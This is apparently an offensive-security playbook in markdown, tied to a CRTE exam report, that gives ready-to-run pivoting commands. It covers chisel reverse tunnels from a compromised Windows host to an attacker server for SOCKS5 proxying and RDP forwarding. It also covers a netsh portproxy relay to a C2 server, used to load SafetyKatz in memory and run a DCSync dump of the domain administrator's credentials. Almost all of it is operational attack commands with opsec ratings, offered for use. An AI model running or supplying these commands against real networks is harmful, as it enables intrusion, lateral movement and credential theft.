# Chisel Proxying & Tunneling

### Chisel SOCKS5 Proxy via Compromised Host [added: 2026-04]
- **Tags:** #Chisel #SOCKS5 #Proxying #Pivoting #ReverseTunnel #Proxychains #Windows #Linux
- **Trigger:** Compromised a host that has access to an internal network segment unreachable from the attacker machine
- **Prereq:** Chisel binary on both attacker and target + outbound connectivity from target to attacker on chosen port
- **Yields:** SOCKS5 proxy on attacker machine (127.0.0.1:1080) routing traffic through the compromised host into the internal network
- **Opsec:** Med
- **Context:** Need to pivot through a Windows host to reach internal network segments — set up SOCKS5 proxy via chisel reverse tunnel
- **Payload/Method:**
  ```bash
  # --- ATTACKER (Linux) ---
  # Step 1: Start chisel server in reverse mode
  ./chisel server -p 8888 --reverse

  # --- TARGET (Windows) ---
  # Step 2: Connect back to attacker, forward port 9001 (target's socks server) to attacker:8001
  .\chisel_windows_386.exe client <attacker-ip>:8888 R:8001:127.0.0.1:9001

  # --- TARGET (Windows) ---
  # Step 3: Start SOCKS5 server on target port 9001
  .\chisel_windows_386.exe server -p 9001 --socks5

  # --- ATTACKER (Linux) ---
  # Step 4: Connect through the tunnel to open local SOCKS5 on attacker port 1080
  ./chisel client localhost:8001 socks

  # Now configure proxychains to use 127.0.0.1:1080 (SOCKS5)
  # proxychains nmap -sT -Pn <internal-target>
  # proxychains crackmapexec smb <internal-target>
  ```

### Chisel Single-Port Forward (Simple Port Tunnel) [added: 2026-04]
- **Tags:** #Chisel #PortForward #RDP #ReverseTunnel #SinglePort #Pivoting #Windows
- **Trigger:** Need to access a specific port on an internal host (e.g., RDP, web admin panel) that is not directly reachable
- **Prereq:** Chisel binary on both attacker and target + outbound connectivity from target to attacker
- **Yields:** Direct access to a specific internal service (e.g., RDP) via a local port on the attacker machine
- **Opsec:** Low
- **Context:** Forward a specific internal port to attacker machine (e.g., RDP on internal host)
- **Payload/Method:**
  ```bash
  # Attacker: reverse server
  ./chisel server -p 8888 --reverse

  # Target: forward internal RDP (3389) to attacker port 3390
  .\chisel_windows_386.exe client <attacker-ip>:8888 R:3390:127.0.0.1:3389

  # Attacker: RDP to 127.0.0.1:3390 → reaches target's RDP
  xfreerdp /u:Administrator /p:password /v:127.0.0.1:3390
  ```

### netsh Port Proxy — Native Windows Port Forwarding for Tool Relay (CRTE Exam Report) [added: 2026-04]
- **Tags:** #netsh #PortProxy #NativeWindows #PortForwarding #LOLBIN #Pivoting #SubnetRelay #NoToolDrop
- **Trigger:** Compromised Windows machine cannot reach the C2/tool server directly, and no external tunneling tools (chisel/ligolo) are available
- **Prereq:** Admin access on intermediate Windows host + netsh available (built-in) + network route between subnets
- **Yields:** HTTP tool relay across subnet boundaries using only native Windows binaries, enabling in-memory tool loading from isolated networks
- **Opsec:** Low
- **Context:** Compromised machine cannot reach the C2/HFS server directly. Use native `netsh portproxy` to forward a local port to the C2, allowing in-memory tool loading from isolated subnets without external tooling.
- **Payload/Method:**
  ```cmd
  REM Forward local port 8080 → C2 HFS server
  netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=<C2_IP>

  REM Now load tools in-memory via the forwarded port (Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe ...)
  c:\programdata\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "privilege::debug" "token::elevate" "lsadump::dcsync /user:domain\administrator" "exit"

  REM Cleanup
  netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
  ```
- **Key insight:** This requires no additional binaries — `netsh` is built into Windows. Ideal when chisel/ligolo are unavailable but you need to relay HTTP-hosted tools across subnet boundaries.
